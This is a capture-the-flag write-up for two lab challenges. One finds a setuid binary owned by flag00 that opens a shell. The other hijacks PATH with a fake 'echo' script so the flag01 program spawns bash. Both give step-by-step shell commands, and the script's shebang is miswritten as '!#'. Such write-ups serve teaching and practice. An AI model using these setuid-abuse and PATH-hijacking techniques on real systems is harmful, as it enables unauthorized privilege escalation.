Setuid - Points: 500
Find an executable file owned by flag00 with Set User ID. Read the ‘flag.txt‘ file in flag00’s home. Log in as level00 with password level00

To login:
Username: level00
Password: level00

As the statement suggest we have to find an executable owned by flag00 with the set user id. We can find it by using the command find. After that by simply running the file so found a bash opens as user flag00, then we can read the flag. 

$ cd /tmp
$ find / -user flag00 > tmp
$ cat tmp
$ cd /home/flag00/
$ /usr/share/nano/fishy
$ cat flag.txt

Arbitrary Command Exec - Points: 500
Use the ‘/home/flag01/flag01‘ executable to read flag.txt.
Source code available at ‘/home/flag01/flag01.c‘
Log in as level01 with password level01

To login:
Username: level01
Password: level01

As the image above show this program use the /usr/bin/env echo to print out the value of a readable file. Then, we can write our own echo executable and let the file use it instead of the deafault one. Let's create a file named echo with inside the code to execute a bash, then modify the PATH variable accordingly and start the flag01 executable from the folder we have created the echo file in and, after the bash pop up, read the flag. 

$ nano echo
    !#/usr/bin/env bash
    bash
$ export PATH=:/home/level01:/bin
$ ../flag01/flag01
$ cat /home/flag01/flag.txt
